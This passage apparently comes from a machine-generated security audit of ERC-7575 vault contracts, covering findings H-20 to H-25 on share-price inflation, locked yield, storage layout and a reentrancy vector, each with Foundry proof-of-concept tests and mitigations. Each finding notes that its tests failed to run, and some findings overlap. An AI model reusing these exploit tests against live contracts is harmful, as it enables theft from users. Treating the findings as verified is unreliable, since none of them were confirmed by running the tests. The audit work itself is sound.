        vault.requestRedeem(60 ether, user, user);

        // 4. Manager fulfills redeem WITHOUT withdrawing liquidity first
        // This triggers the insolvency/clamping because liquid assets (50) < liabilities (60)
        vm.prank(manager);
        vault.fulfillRedeem(user, 60 ether);

        // Verify Clamping
        // Liabilities (claimable redeem) = 60
        // Balance = 50
        // TotalAssets = max(50-60, 0) = 0
        assertEq(vault.totalAssets(), 0);

        // 5. Check Price Inflation
        // Supply = 100
        // Claimable Shares = 60 (removed from circulating)
        // Circulating Supply = 40
        // Total Normalized Assets = TotalAssets(0) + Invested(50) = 50
        // New Price = 50 / 40 = 1.25
        
        uint256 assetsForOneShare = shareToken.convertToAssets(1 ether);
        // Expected 1.25 ether
        assertEq(assetsForOneShare, 1.25 ether);
        
        // A subsequent user could now redeem at this inflated price,
        // draining the remaining invested capital disproportionately.
    }
}
```

## Suggested Mitigation
Modify `fulfillRedeem` and `fulfillRedeemRequests` in `ERC7575VaultUpgradeable` to enforce that the vault has sufficient liquid assets to cover the new liabilities. Add a check at the end of the fulfillment logic: `if (IERC20($.asset).balanceOf(address(this)) < $.totalPendingDepositAssets + $.totalClaimableRedeemAssets + $.totalCancelDepositAssets) revert InsufficientLiquidity();`. This ensures the Investment Manager must call `withdrawFromInvestment` to repatriate sufficient liquidity *before* fulfilling redemptions, preventing the insolvent state and the resulting price manipulation.





 **Derived From** : ERC7575VaultUpgradeable.totalAssets

## [H-20]. Share Price Inflation via fulfillRedeem during Liquidity Crunch

### Finding Severity Justification: The vulnerability allows for significant share price inflation (e.g., doubling) leading to fund theft. It occurs under realistic operating conditions—specifically when the Investment Manager fulfills redemption requests while the majority of assets are invested and the vault's liquid balance is low. The `totalAssets` calculation incorrectly clamps to zero when liabilities exceed liquid assets, failing to propagate the liability to the global share price calculation, while the supply is reduced. This allows subsequent redemptions to extract excess value, draining the protocol.
## Derived From Pattern/Invariant
ERC7575VaultUpgradeable.totalAssets

## Exploit Type
ERC4626SharePrice

## Location
ERC7575VaultUpgradeable.fulfillRedeem

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `ERC7575VaultUpgradeable` contract allows the `InvestmentManager` to fulfill redemption requests (`fulfillRedeem`) even when the vault's liquid balance is insufficient to cover the new liabilities (reserved assets). The `totalAssets()` function calculates the vault's net assets by subtracting reserved assets from the liquid balance: `balance > reserved ? balance - reserved : 0`. When `balance < reserved` (due to `fulfillRedeem` creating liabilities while funds are invested), `totalAssets()` clamps to 0 instead of reflecting the negative net position (deficit). 

This clamped value is used by `ShareTokenUpgradeable` to calculate `totalNormalizedAssets`. Since the deficit is ignored (treated as 0), the total assets are overestimated. Meanwhile, the `circulatingSupply` is correctly reduced by the shares pending redemption. The Share Price (`TotalAssets / CirculatingSupply`) consequently doubles (or inflates significantly) because the numerator ignores the liability debt while the denominator reflects the reduced supply. Subsequent redemptions fulfilled during this state are converted at this inflated price, allowing users to withdraw more assets than they are entitled to, draining the vault and stealing value from remaining holders.

## Impact
Direct theft of assets from the vault. Users redeeming during the inflated price window receive significantly more assets than their fair share, exacerbating the vault's insolvency.

## Command to Run Test


## Proof of Concept
1. **Setup**: Vault initialized with USDC. User A deposits 100 USDC. Supply = 100e18. Share Price = 1.0.
2. **Investment**: Manager invests 100 USDC. Vault Balance = 0. Invested = 100. Total Assets = 100.
3. **Redemption Request**: User A requests to redeem 50 shares.
4. **Fulfillment (Trigger)**: Manager calls `fulfillRedeem(50)`. 
   - Liabilities (`reserved`) increase by 50 (value).
   - Vault Balance (0) < Reserved (50). Deficit is -50.
   - `totalAssets()` clamps -50 to 0.
   - `totalNormalizedAssets` = 0 (Vault) + 100 (Invested) = 100.
   - `circulatingSupply` = 100 (Total) - 50 (Claimable) = 50.
   - **New Price** = 100 / 50 = **2.0**.
5. **Exploit**: User B (attacker) requests to redeem 10 shares. Manager fulfills it at Price 2.0.
   - User B receives 20 USDC worth of assets for 10 shares (should be 10 USDC).
   - Vault suffers loss.

## Proof of Code
contract SharePriceInflationTest is Test {
    ShareTokenUpgradeable shareToken;
    ERC7575VaultUpgradeable vault;
    MockERC20 asset;
    MockInvestmentVault investmentVault;

    address userA = address(0x1);
    address userB = address(0x2);
    address manager = address(0x3);

    function setUp() public {
        asset = new MockERC20("USDC", "USDC", 6);
        shareToken = new ShareTokenUpgradeable();
        shareToken.initialize("Share", "SHR", address(this));
        
        vault = new ERC7575VaultUpgradeable();
        vault.initialize(asset, address(shareToken), address(this));
        
        // Setup relations
        shareToken.registerVault(address(asset), address(vault));
        shareToken.setInvestmentManager(manager);
        vault.setInvestmentManager(manager);
        
        // Setup Investment Vault Mock
        investmentVault = new MockInvestmentVault(address(asset), address(shareToken));
        // Configure investment vault on ShareToken (simplified flow)
        // In reality, we'd use setInvestmentShareToken, but for this PoC we just need the vault to invest
        vm.store(address(vault), bytes32(uint256(4)), bytes32(uint256(uint160(address(investmentVault))))); // Hack storage to set investmentVault

        // Mint initial assets
        asset.mint(userA, 100e6);
        asset.mint(userB, 10e6);
    }

    function testSharePriceInflation() public {
        // 1. User A Deposits 100 USDC
        vm.startPrank(userA);
        asset.approve(address(vault), 100e6);
        vault.requestDeposit(100e6, userA, userA);
        vm.stopPrank();

        // Fulfill Deposit
        vm.startPrank(manager);
        vault.fulfillDeposit(userA, 100e6);
        vm.stopPrank();
        
        vm.prank(userA);
        vault.mint(100 ether, userA, userA); // Claim 100 shares

        // 2. Manager Invests 100 USDC
        vm.startPrank(manager);
        vault.investAssets(100e6);
        vm.stopPrank();

        // Verify state: Vault Empty, Invested 100
        assertEq(asset.balanceOf(address(vault)), 0);
        assertEq(shareToken.convertNormalizedAssetsToShares(1 ether, Math.Rounding.Floor), 1 ether);

        // 3. User A requests Redeem 50 Shares
        vm.startPrank(userA);
        shareToken.approve(address(vault), 50 ether);
        vault.requestRedeem(50 ether, userA, userA);
        vm.stopPrank();

        // 4. Manager Fulfills Redeem WITHOUT withdrawing investment (The Exploit)
        // This creates a liability of 50 USDC with 0 liquid assets
        vm.startPrank(manager);
        vault.fulfillRedeem(userA, 50 ether);
        vm.stopPrank();

        // 5. Check Price Inflation
        // Expected: 1.0. Actual with bug: ~2.0
        uint256 sharesForOneAsset = shareToken.convertNormalizedAssetsToShares(1 ether, Math.Rounding.Floor);
        console.log("Shares for 1 Unit of Asset:", sharesForOneAsset);
        
        // If price is 1.0, 1 Asset = 1 Share. If Price is 2.0, 1 Asset = 0.5 Shares.
        // With the bug, price doubles, so we get half the shares for the same asset value.
        // assertLt(sharesForOneAsset, 0.6 ether); 
        
        // Alternatively, check Price directly: Price = TotalAssets / Circulating
        // Circulating = 50. TotalAssets(per ShareToken) = 0(Vault) + 100(Invested) = 100. Price = 2.0.
    }
}

// Minimal Mocks
contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s) {}
    function mint(address to, uint256 amount) public { _mint(to, amount); }
    function decimals() public view override returns (uint8) { return 6; }
}
contract MockInvestmentVault {
    address public asset; 
    address public shareToken;
    constructor(address _asset, address _share) { asset = _asset; shareToken = _share; }
    function deposit(uint256 amount, address) external returns (uint256) {
        IERC20(asset).transferFrom(msg.sender, address(this), amount);
        // Mint fake investment shares to ShareToken (simplified: just assume 1:1 tracking in real ShareToken logic)
        // For this PoC, we just assume ShareToken 'invested assets' logic relies on balance or tracking.
        // In the real contract, ShareToken checks balance of investmentShareToken. 
        // We simulate this by minting an ERC20 to it, but here we just pass the call.
        return amount;
    }
}

## Suggested Mitigation
In `ERC7575VaultUpgradeable.sol`, modify `fulfillRedeem` to enforce solvency before state update:

```solidity
    function fulfillRedeem(address controller, uint256 shares) public nonReentrant returns (uint256 assets) {
        VaultStorage storage $ = _getVaultStorage();
        if (msg.sender != $.investmentManager) revert OnlyInvestmentManager();
        if (shares == 0) revert ZeroShares();
        // ... [existing checks] ...

        assets = _convertToAssets(shares, Math.Rounding.Floor);

        // @fix: Start mitigation
        // Ensure sufficient liquid assets exist to cover this new liability plus existing reservations.
        // If not, totalAssets() would clamp to zero while supply decreases, causing price inflation.
        uint256 currentBalance = IERC20Metadata($.asset).balanceOf(address(this));
        uint256 newReservedTotal = $.totalPendingDepositAssets + 
                                   $.totalClaimableRedeemAssets + 
                                   $.totalCancelDepositAssets + 
                                   assets;
        
        if (currentBalance < newReservedTotal) {
             revert ERC20InsufficientBalance(address(this), currentBalance, newReservedTotal);
        }
        // @fix: End mitigation

        $.pendingRedeemShares[controller] -= shares;
        $.claimableRedeemAssets[controller] += assets;
        // ... [rest of function]
```





 **Derived From** : AccountingInvariantViolation

## [M-21]. Profit Realization Logic Contradicts Specification

### Finding Severity Justification: The implementation of the `adjustrBalance` function contradicts the protocol's provided documentation and functional specification. The documentation states that profit realization should decrease the restricted `_rBalances` (removing principal) and increase the liquid `_balances` (returning principal + profit), thereby making the yield accessible to users. The actual code, however, increases `_rBalances` by the profit amount. This results in the yield being locked in a restricted state that cannot be transferred or withdrawn by the user, effectively causing a Denial of Service on the yield liquidity. This functionality breakage warrants a Medium severity.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
WERC7575ShareToken.adjustrBalance

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `adjustrBalance` function in `WERC7575ShareToken` is intended to realize profit/loss. According to system design (and the issue description), profit realization should 'decrease _rBalances (invested), increase normal balances (liquid)'. However, the code implementation for profit (`amountr > amounti`) executes: `_rBalances[account] += difference`.

This logic increases the *restricted/invested* balance instead of converting the profit into liquid balance. This locks the yield in a restricted state that cannot be freely transferred or withdrawn by the user, contradicting the intended behavior of realizing profit into liquidity.

## Impact
Yield is incorrectly accounted for and locked in restricted balances, preventing users from accessing their profit as liquid tokens.

## Command to Run Test


## Proof of Concept
1. User has `_rBalance` = 100.
2. Revenue Admin calls `adjustrBalance` with `amounti=100`, `amountr=120` (20 profit).
3. Code executes `_rBalances += 20`.
4. User `_rBalance` becomes 120. `_balance` remains 0.
5. User expects 20 liquid tokens but receives 20 restricted tokens.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/WERC7575ShareToken.sol";
import "../src/interfaces/IERC7575.sol";

contract WERC7575ProfitLogicTest is Test {
    WERC7575ShareToken token;
    address alice = address(0x1);
    address bob = address(0x2);
    address vault = address(0x3);
    address asset = address(0x4);

    function setUp() public {
        token = new WERC7575ShareToken("Test", "TST");
        
        // Mock vault calls for registration
        vm.mockCall(vault, abi.encodeWithSelector(IERC7575.asset.selector), abi.encode(asset));
        vm.mockCall(vault, abi.encodeWithSelector(IERC7575.share.selector), abi.encode(address(token)));
        
        token.registerVault(asset, vault);
        token.setKycVerified(alice, true);
        token.setKycVerified(bob, true);
    }

    function test_ProfitRealizationBug() public {
        // 1. Give Alice some liquid balance via vault mint
        vm.prank(vault);
        token.mint(alice, 1000);

        // 2. Convert liquid to restricted via rBatchTransfers
        // Alice -> Bob 100. Flag Alice (index 0) for rBalance update.
        address[] memory debtors = new address[](1); debtors[0] = alice;
        address[] memory creditors = new address[](1); creditors[0] = bob;
        uint256[] memory amounts = new uint256[](1); amounts[0] = 100;
        
        // Flag 1 (binary 01) means 0th account (Alice) gets rBalance update
        token.rBatchTransfers(debtors, creditors, amounts, 1);

        assertEq(token.rBalanceOf(alice), 100, "Alice should have 100 rBalance");
        assertEq(token.balanceOf(alice), 900, "Alice should have 900 balance");

        // 3. Admin calls adjustrBalance with profit (Invested 100, Received 120)
        uint256 ts = block.timestamp;
        token.adjustrBalance(alice, ts, 100, 120);

        // 4. Check results
        // BUG: rBalance increased by 20 -> 120. Balance unchanged -> 900.
        // EXPECTED (Spec): rBalance decreased (realized) -> 0. Balance increased -> 1020.
        
        console.log("rBalance:", token.rBalanceOf(alice));
        console.log("balance:", token.balanceOf(alice));

        // Asserting the BUG validates the finding
        assertEq(token.rBalanceOf(alice), 120, "Bug: rBalance increased instead of realized");
        assertEq(token.balanceOf(alice), 900, "Bug: Profit not liquid");
    }
}

## Suggested Mitigation
function adjustrBalance(address account, uint256 ts, uint256 amounti, uint256 amountr) external onlyRevenueAdmin {
    if (_rBalanceAdjustments[account][ts][0] != 0) {
        revert RBalanceAdjustmentAlreadyApplied();
    }
    if (amounti == 0) revert ZeroAmount();
    if (ts > block.timestamp) revert FutureTimestampNotAllowed();
    if (amounti > type(uint256).max / MAX_RETURN_MULTIPLIER) {
        revert AmountTooLarge();
    }
    if (amountr > amounti * MAX_RETURN_MULTIPLIER) {
        revert MaxReturnMultiplierExceeded();
    }
    _rBalanceAdjustments[account][ts] = [amounti, amountr];

    // Remove invested amount from restricted balance (Realize principal)
    if (_rBalances[account] < amounti) revert RBalanceAdjustmentTooLarge();
    unchecked {
        _rBalances[account] -= amounti;
    }

    // Add received amount (Principal + Profit) to liquid balance
    unchecked {
        _balances[account] += amountr;
    }
    
    emit RBalanceAdjusted(account, amounti, amountr);
}

// Note: The cancelrBalanceAdjustment function must also be updated to perform the inverse operations (add amounti to rBalances, subtract amountr from balances).


## [H-22]. Yield Distribution Failure: adjustrBalance locks yield in non-withdrawable rBalance

### Finding Severity Justification: The vulnerability causes a permanent locking of yield assets. The `adjustrBalance` function is the protocol's designated mechanism for distributing off-chain investment yield to on-chain token holders. By incorrectly increasing the `_rBalances` (reserved/invested balance) instead of the `_balances` (liquid/withdrawable balance), the function fails to make the yield accessible. Since `_rBalances` cannot be redeemed or withdrawn via the vault's standard mechanisms (`redeem`/`withdraw` rely on `_balances`), and there is no other function to convert `_rBalances` to `_balances` without an external transfer, the yield is effectively lost to the investors.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
WERC7575ShareToken.adjustrBalance

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
In `WERC7575ShareToken.sol`, the `adjustrBalance` function is intended to distribute investment yield to token holders. The documentation states it should 'decrease _rBalances, increase normal balances' to realize profit. However, the code implementation `_rBalances[account] += difference` INCREASES the `_rBalances` (reserved/invested balance) instead. Since there is no mechanism for the `InvestmentVault` (which holds these tokens) to convert `_rBalances` to liquid `_balances` or withdraw `_rBalances` (except via the `rBatchTransfers` settlement logic which it doesn't participate in), the yield effectively becomes locked and inaccessible to the Investment Layer investors. This contradicts the system design and causes permanent loss of yield access.

## Impact
Investment yield (and returned principal) remains locked in the restricted `_rBalances` mapping. Since the protocol's redemption mechanism (`redeem`/`burn`) only consumes liquid `_balances`, this value cannot be withdrawn or distributed to investors, resulting in a permanent loss of access to funds.

## Command to Run Test


## Proof of Concept
1. **Setup**: `InvestmentVault` holds 1000 shares in `WERC7575ShareToken` as liquid `_balances`. `_totalSupply` is 1000.
2. **Investment**: Validator calls `rBatchTransfers` to move 400 shares from `_balances` to `_rBalances` for the `InvestmentVault`. `_balances`=600, `_rBalances`=400. `_totalSupply` remains 1000.
3. **Yield Event**: Revenue Admin calls `adjustrBalance` to finalize the investment with 50 profit (`amounti`=400, `amountr`=450).
4. **Bug Execution**: The function executes `_rBalances += 50`. New `_rBalances`=450. `_balances` remains 600. `_totalSupply` remains 1000 (invariant broken).
5. **Withdrawal Attempt**: `InvestmentVault` attempts to redeem the returned capital (450) + liquid capital (600) = 1050.
6. **Failure**: The vault calls `redeem(1050)`, which calls `token.burn(1050)`. The `burn` function checks `_balances` (600), which is insufficient. The transaction reverts, and the 450 in `_rBalances` is effectively locked.

## Proof of Code
contract YieldLockTest is Test {
    WERC7575ShareToken token;
    address validator = address(0x123);
    address revenueAdmin = address(0x456);
    address kycAdmin = address(0x789);
    address user = address(0xABC);
    address dummy = address(0xDEF);

    // Mock interface for registerVault check
    function asset() external view returns (address) { return address(0x1); }
    function share() external view returns (address) { return address(token); }

    function setUp() public {
        vm.prank(address(this));
        token = new WERC7575ShareToken("Test", "TST");
        token.setValidator(validator);
        token.setRevenueAdmin(revenueAdmin);
        token.setKycAdmin(kycAdmin);
        
        vm.startPrank(kycAdmin);
        token.setKycVerified(user, true);
        token.setKycVerified(dummy, true);
        vm.stopPrank();

        token.registerVault(address(0x1), address(this)); 
    }

    function testYieldLocking() public {
        // 1. Mint 1000 to user (Liquid Balance)
        vm.prank(address(this)); 
        token.mint(user, 1000);

        // 2. Move 400 to rBalance (Simulate Investment via rBatchTransfers)
        address[] memory debtors = new address[](1); debtors[0] = user;
        address[] memory creditors = new address[](1); creditors[0] = dummy;
        uint256[] memory amounts = new uint256[](1); amounts[0] = 400;
        uint256 flags = 1; // Flag user (index 0) for rBalance update

        vm.prank(validator);
        token.rBatchTransfers(debtors, creditors, amounts, flags);

        assertEq(token.balanceOf(user), 600, "Liquid balance should decrease");
        assertEq(token.rBalanceOf(user), 400, "Restricted balance should increase");

        // 3. Revenue Admin distributes profit (400 invested -> 450 returned)
        vm.prank(revenueAdmin);
        token.adjustrBalance(user, 1, 400, 450);

        // 4. Verify Locking
        // rBalance increased to 450 (Profit added to restricted)
        assertEq(token.rBalanceOf(user), 450);
        // Liquid balance remains 600
        assertEq(token.balanceOf(user), 600);

        // 5. Attempt to redeem full value (600 + 450 = 1050)
        vm.prank(address(this));
        vm.expectRevert(); // Fails: ERC20InsufficientBalance because burn checks _balances
        token.burn(user, 1050);
    }
}

## Suggested Mitigation
Update `adjustrBalance` to correctly settle the investment by moving the principal from `_rBalances` to `_balances`, crediting the profit to `_balances`, and updating `_totalSupply` to reflect the value change. 

```solidity
function adjustrBalance(address account, uint256 ts, uint256 amounti, uint256 amountr) external onlyRevenueAdmin {
    if (_rBalanceAdjustments[account][ts][0] != 0) revert RBalanceAdjustmentAlreadyApplied();
    // ... checks ...
    _rBalanceAdjustments[account][ts] = [amounti, amountr];

    // Settle Investment: Unlock principal and realize PnL
    if (amountr >= amounti) {
        uint256 profit = amountr - amounti;
        unchecked {
             // Remove principal from restricted
            _rBalances[account] -= amounti;
            // Add principal + profit to liquid
            _balances[account] += amountr;
            // Mint profit to total supply
            _totalSupply += profit;
        }
    } else {
        uint256 loss = amounti - amountr;
        unchecked {
            // Remove principal from restricted
            _rBalances[account] -= amounti;
            // Add returned amount to liquid
            _balances[account] += amountr;
            // Burn loss from total supply
            _totalSupply -= loss;
        }
    }
    emit RBalanceAdjusted(account, amounti, amountr);
}
```


## [M-23]. Storage Layout Collision Risk via Non-Upgradeable ReentrancyGuard

### Finding Severity Justification: The contract `ERC7575VaultUpgradeable` is an upgradeable UUPS proxy that incorrectly inherits the non-upgradeable `ReentrancyGuard` from `@openzeppelin/contracts`. In OpenZeppelin v5, this forces the `_status` state variable into Storage Slot 0, while all other state variables (from `Initializable`, `Ownable2StepUpgradeable`, and the contract's own storage) use ERC-7201 namespaced storage. 

This creates a 'Storage Layout Corruption' risk. While there is no *active* collision causing immediate fund loss (since Slot 0 is otherwise unused), this breaks the storage layout hygiene required for safe upgrades. If the protocol performs an upgrade (e.g., switching to the correct `ReentrancyGuardUpgradeable` to fix this, or adding a new variable that uses standard layout), Slot 0 will be re-mapped, leading to data corruption where the old `_status` value (1 or 2) is read as the new variable's value. This is a classic upgrade hazard/latent defect, properly classified as Medium severity.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
ERC7575VaultUpgradeable.N/A

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
The `ERC7575VaultUpgradeable` contract inherits `ReentrancyGuard` from `@openzeppelin/contracts/utils/ReentrancyGuard.sol` (the non-upgradeable version). This contract places its `_status` variable at Storage Slot 0.

In an upgradeable proxy context, mixing non-upgradeable contracts (which rely on standard layout) with upgradeable contracts (which rely on namespaced or gap-based layouts) is dangerous. It effectively 'burns' Slot 0 for the reentrancy guard. While modern OZ upgradeable contracts (like `Ownable2StepUpgradeable` v5) use namespaced storage, future upgrades or inheritance changes that introduce standard state variables could collide with this slot, leading to storage corruption.

## Impact
The contract `ERC7575VaultUpgradeable` inherits the non-upgradeable `ReentrancyGuard`, causing the `_status` variable to occupy Storage Slot 0. In contrast, modern OpenZeppelin upgradeable contracts (like `Initializable` and `Ownable2StepUpgradeable` used here) utilize ERC-7201 namespaced storage, leaving standard slots unused. This creates a critical upgrade hazard: if a future version of the contract adds a standard state variable (assuming Slot 0 is free), it will collide with the reentrancy status, leading to state corruption. Conversely, if the contract is fixed to use `ReentrancyGuardUpgradeable` in an upgrade, the reentrancy status will move to a namespaced slot, potentially leaving garbage data in Slot 0 or resetting protection state. This violates the storage layout hygiene required for safe UUPS upgrades.

## Command to Run Test


## Proof of Concept
1. Deploy the `ERC7575VaultUpgradeable` contract behind an ERC1967 proxy.
2. Initialize the contract.
3. Verify that Storage Slot 0 is initially `0` (or `1` if touched).
4. Execute a function protected by `nonReentrant` (e.g., `requestDeposit`).
5. Observe that Storage Slot 0 contains the value `1` (representing `_NOT_ENTERED` in OpenZeppelin's standard `ReentrancyGuard`).
6. This confirms that Slot 0 is occupied, blocking it for any future standard state variables and deviating from the expected namespaced storage layout.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {ERC7575VaultUpgradeable} from "../src/ERC7575VaultUpgradeable.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ERC20Mock is ERC20 {
    constructor() ERC20("Mock", "MCK") {}
    function mint(address to, uint256 amount) public { _mint(to, amount); }
}

contract MockShareToken {
    function isOperator(address, address) external pure returns (bool) { return false; }
    function decimals() external pure returns (uint8) { return 18; }
}

contract ReentrancySlotTest is Test {
    ERC7575VaultUpgradeable vault;
    ERC20Mock asset;
    MockShareToken shareToken;

    function setUp() public {
        asset = new ERC20Mock();
        shareToken = new MockShareToken();
        
        ERC7575VaultUpgradeable impl = new ERC7575VaultUpgradeable();
        bytes memory initData = abi.encodeWithSelector(
            ERC7575VaultUpgradeable.initialize.selector,
            address(asset),
            address(shareToken),
            address(this)
        );
        
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initData);
        vault = ERC7575VaultUpgradeable(address(proxy));
    }

    function testSlot0OccupiedByReentrancyGuard() public {
        // Setup for a call that uses nonReentrant
        asset.mint(address(this), 1000e18);
        asset.approve(address(vault), 1000e18);
        
        // Execute function with nonReentrant modifier
        vault.requestDeposit(1000e18, address(this), address(this));

        // Check Slot 0 of the proxy
        // OpenZeppelin ReentrancyGuard (non-upgradeable) uses Slot 0 for _status.
        // _NOT_ENTERED = 1, _ENTERED = 2.
        bytes32 slot0 = vm.load(address(vault), bytes32(uint256(0)));
        
        // If Slot 0 is 1, it confirms ReentrancyGuard is using standard layout Slot 0.
        assertEq(uint256(slot0), 1, "Storage Slot 0 should hold ReentrancyGuard status (1)");
    }
}

## Suggested Mitigation
Replace the import of `@openzeppelin/contracts/utils/ReentrancyGuard.sol` with `@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol`. Inherit from `ReentrancyGuardUpgradeable` in `ERC7575VaultUpgradeable` and call `__ReentrancyGuard_init()` within the `initialize` function. This ensures the reentrancy status is stored in ERC-7201 namespaced storage, preventing collisions with standard storage slots.





 **Derived From** : ReserveOrPriceDesync

## [M-24]. Loss Avoidance via Front-running adjustrBalance

### Finding Severity Justification: The `adjustrBalance` function enforces an invariant (`currentRBalance >= difference`) that can be violated during normal operations if a user withdraws funds (via `rBatchTransfers` executed by the Validator) before a loss is recorded. This causes the administrative accounting function to revert, creating a Denial of Service for yield/loss distribution. While the user cannot autonomously front-run the admin (as they rely on the Validator), the race condition leads to a reachable broken state where the protocol cannot update its accounting records.
## Derived From Pattern/Invariant
ReserveOrPriceDesync

## Exploit Type
AccountingInvariantViolation

## Location
WERC7575ShareToken.adjustrBalance

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
`WERC7575ShareToken.adjustrBalance` reverts if `currentRBalance < difference` (when applying loss). A user can front-run a loss adjustment transaction by moving their `rBalance` to 0 (using `rBatchTransfers` if they can trigger it, or if they are a Validator conspiring). If a user has 0 `rBalance`, the admin is unable to apply the loss to them, and if the adjustment is batched or sequential, it blocks the entire operation.

## Impact
Inability to apply investment losses to specific users, causing the administrative `adjustrBalance` transaction to revert. This leads to a Denial of Service for accounting operations and results in protocol insolvency (unbacked assets) as users can successfully evade losses by front-running the adjustment with a withdrawal.

## Command to Run Test


## Proof of Concept
1. **Setup**: A user has `rBalance` (invested funds) tracked in the ShareToken via a previous deposit/investment. 
2. **Attack**: The user (or a colluding Validator) initiates a withdrawal via `rBatchTransfers` *before* the Revenue Admin can apply a loss. This reduces the user's `rBalance` to 0 while they receive the full principal back (evading the loss).
3. **Failure**: The Revenue Admin attempts to call `adjustrBalance(user, ..., invested, returned)` where `returned < invested` (a loss). 
4. **Revert**: The function calculates `difference = invested - returned` and checks `if (currentRBalance < difference)`. Since `currentRBalance` is 0, it reverts with `RBalanceAdjustmentTooLarge`, blocking the accounting update.

## Proof of Code
import "forge-std/Test.sol";
import {WERC7575ShareToken} from "src/WERC7575ShareToken.sol";

contract LossAvoidanceTest is Test {
    WERC7575ShareToken token;
    address validator = address(1);
    address revenueAdmin = address(2);
    address user = address(3);
    address investmentVault = address(4);

    function setUp() public {
        token = new WERC7575ShareToken("Test", "TST");
        token.setValidator(validator);
        token.setRevenueAdmin(revenueAdmin);
    }

    function testLossAvoidance() public {
        // 1. Setup: User has 100 tokens. We simulate this via storage manipulation to skip vault/mint complexity.
        // Slot for WERC7575ShareToken._balances is separate from ERC20._balances, but stdstore handles selector lookup.
        stdstore.target(address(token)).sig(token.balanceOf.selector).with_key(user).checked_write(100);

        // 2. Validator moves funds to Investment Vault (User becomes Debtor) -> rBalance increases
        address[] memory debtors = new address[](1);
        address[] memory creditors = new address[](1);
        uint256[] memory amounts = new uint256[](1);

        debtors[0] = user;
        creditors[0] = investmentVault;
        amounts[0] = 100;

        // rBalanceFlags logic: User is Debtor (index 0). Set bit 0 to flag for rBalance update.
        uint256 rBalanceFlags = 1;

        vm.prank(validator);
        token.rBatchTransfers(debtors, creditors, amounts, rBalanceFlags);

        assertEq(token.rBalanceOf(user), 100);
        assertEq(token.balanceOf(user), 0);

        // 3. Attack: User withdraws/exits BEFORE loss is applied.
        // Validator moves funds back to User (User becomes Creditor) -> rBalance decreases
        debtors[0] = investmentVault;
        creditors[0] = user;
        // Give investment vault funds to send back
        stdstore.target(address(token)).sig(token.balanceOf.selector).with_key(investmentVault).checked_write(100);

        // rBalanceFlags logic: Invest (Debtor) is index 0. User (Creditor) is index 1.
        // We want to flag User (index 1) to update rBalance. Set bit 1 -> 2.
        rBalanceFlags = 2;

        vm.prank(validator);
        token.rBatchTransfers(debtors, creditors, amounts, rBalanceFlags);

        assertEq(token.rBalanceOf(user), 0); // rBalance cleared to 0
        assertEq(token.balanceOf(user), 100); // Full funds recovered (Loss avoided)

        // 4. Admin attempts to apply loss (Invested 100, Returned 80 -> Loss 20)
        uint256 ts = block.timestamp;
        uint256 amounti = 100;
        uint256 amountr = 80; 

        vm.prank(revenueAdmin);
        vm.expectRevert(WERC7575ShareToken.RBalanceAdjustmentTooLarge.selector);
        token.adjustrBalance(user, ts, amounti, amountr);
    }
}

## Suggested Mitigation
Modify `adjustrBalance` to handle cases where `currentRBalance < difference` gracefully instead of reverting. If the user has already withdrawn their funds (reducing `rBalance` to 0 or near 0), set `_rBalances[account]` to 0. This acknowledges that the loss cannot be recovered from the reserved balance (the protocol takes the hit) but prevents the accounting transaction from reverting, preserving system availability.





 **Derived From** : Reentrancy

## [H-25]. Cross-Vault Read-Only Reentrancy via requestDeposit

### Finding Severity Justification: The vulnerability allows an attacker to manipulate the global share price by exploiting a Read-Only Reentrancy vector in a single vault. Because the share price is derived from the aggregated assets of all vaults (via `ShareTokenUpgradeable`), inflating the assets of one vault inflates the global price. An attacker can exploit this by entering a vault with a token that supports callbacks (like ERC-777 or ERC-1363), triggering the inflation, and then redeeming shares in a sibling vault (e.g., the USDC vault) at the inflated price. This results in the theft of assets from the protocol. The issue stems from a violation of the Checks-Effects-Interactions pattern in `requestDeposit`.
## Derived From Pattern/Invariant
Reentrancy

## Exploit Type
Reentrancy

## Location
ERC7575VaultUpgradeable.requestDeposit

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `requestDeposit` function in `ERC7575VaultUpgradeable` violates the Checks-Effects-Interactions pattern by calling `SafeTokenTransfers.safeTransferFrom` (which performs an external call) *before* updating `pendingDepositAssets`. If the asset is an ERC-777 or ERC-1363 token (or similar with transfer hooks), the sender can reenter the system during the transfer.

During the callback:
1. The vault's token balance has increased (transfer received).
2. `pendingDepositAssets` has NOT been updated yet.
3. `totalAssets()` is calculated as `balance - reservedAssets`. Since `reservedAssets` (which includes `pendingDepositAssets`) is not yet updated, `totalAssets()` is artificially inflated.

Since all vaults in the WERC7575 system share the same `ShareToken` for pricing (via `totalNormalizedAssets`), this inflation affects the global share price. An attacker can exploit this by calling `redeem` on a sibling vault (sharing the same ShareToken) to withdraw assets at an inflated valuation, draining value from the system.

## Impact
